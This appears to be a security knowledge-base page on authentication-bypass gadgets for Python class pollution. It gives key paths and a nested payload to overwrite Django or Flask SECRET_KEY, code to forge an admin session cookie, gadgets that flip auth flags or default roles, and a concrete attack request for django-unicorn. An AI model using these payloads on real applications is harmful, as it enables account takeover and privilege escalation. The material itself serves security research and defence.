---
title: "Auth Bypass Gadgets"
weight: 4
---

# Authentication Bypass Gadgets

Authentication bypass gadgets allow attackers to forge credentials, escalate privileges, or bypass security checks.

## Gadget 1: Django SECRET_KEY Overwrite

**Mechanism**: Django uses `SECRET_KEY` to sign session cookies, CSRF tokens, and password reset tokens. If the attacker can overwrite this key with a known value, they can forge valid sessions for any user.

**Key Path**:
```
__init__.__globals__.sys.modules.django.template.backends.django.settings.SECRET_KEY
```

or:
```
__init__.__globals__.sys.modules.django.conf.settings.SECRET_KEY
```

**Value**: `"13371337"` (any attacker-known string)

**Effect**:
1. Attacker knows the SECRET_KEY
2. Attacker forges a session cookie for any user (including admin)
3. Server validates the forged cookie (signature matches)
4. Attacker is authenticated as any user

### Exploitation Steps

```python
# 1. Pollute SECRET_KEY
payload = {
    "__class__": {
        "__init__": {
            "__globals__": {
                "sys": {
                    "modules": {
                        "django": {
                            "conf": {
                                "settings": {
                                    "SECRET_KEY": "attacker_key"
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

# 2. Forge session cookie using known key
from django.core.signing import Signer
signer = Signer(key="attacker_key")
forged_session = signer.sign(admin_session_data)

# 3. Send request with forged cookie → authenticated as admin
```

## Gadget 2: Flask SECRET_KEY Overwrite

**Mechanism**: Same concept as Django — Flask uses SECRET_KEY for session signing.

**Key Path** (application-specific):
```
__init__.__globals__.app.secret_key
```

**Value**: `"attacker_known_key"`

**Effect**: Attacker can forge Flask session cookies.

## Gadget 3: Authentication Flag Overwrite

**Mechanism**: Some applications store authentication state in class or module variables that can be polluted.

```python
class AuthMiddleware:
    require_auth = True  # Class variable

# After pollution: AuthMiddleware.require_auth = False
# All requests bypass authentication
```

## Gadget 4: Role/Permission Escalation

**Mechanism**: If user roles or permissions are resolved from class attributes or module-level configs:

```python
class UserPermissions:
    default_role = "user"
    admin_endpoints = ["/admin", "/settings"]

# After pollution: UserPermissions.default_role = "admin"
# New users get admin role by default
```

## Real-World Example: django-unicorn (CVE-2025-24370)

In django-unicorn, the `settings` module is reachable through the class pollution traversal:

1. The `set_property_value` function processes WebSocket messages without validating the key path
2. An attacker sends: `name=__class__.__init__.__globals__.sys.modules.django.conf.settings.SECRET_KEY&value=pwned`
3. Django's SECRET_KEY is overwritten
4. Attacker forges admin session cookie using the known key
5. Full authentication bypass achieved

{{< hint danger >}}
Authentication bypass via SECRET_KEY pollution is particularly dangerous because:
- It's **silent** — no failed login attempts in logs
- It's **universal** — works for any user account
- It's **persistent** — until the key is rotated or the server restarts
{{< /hint >}}
